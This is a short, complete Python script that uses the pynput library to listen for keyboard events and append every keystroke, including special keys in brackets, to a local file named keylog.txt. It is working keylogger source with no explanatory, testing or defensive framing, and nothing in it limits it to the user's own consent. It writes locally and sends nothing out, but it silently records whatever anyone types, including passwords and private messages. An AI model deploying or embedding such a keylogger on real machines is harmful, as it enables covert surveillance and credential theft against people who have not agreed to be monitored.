from pynput.keyboard import Listener

# Path to save the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Log key strokes
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def main():
    # Start listening to keyboard events
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()